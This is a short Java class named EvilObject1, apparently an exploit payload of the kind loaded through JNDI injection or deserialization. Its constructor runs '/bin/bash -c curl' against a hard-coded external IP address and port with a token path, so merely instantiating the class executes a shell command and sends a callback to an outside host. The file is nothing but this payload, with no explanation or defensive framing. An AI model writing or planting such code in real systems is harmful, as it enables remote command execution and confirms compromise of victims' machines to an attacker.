public class EvilObject1 {
    public EvilObject1() throws Exception {
        Runtime rt = Runtime.getRuntime();
        String[] commands = {"/bin/bash", "-c", " curl http://75.119.131.210:65535/1be999737ab24f629184e2bb039b3858"};
        Process pc = rt.exec(commands);
        pc.waitFor();
    }
}
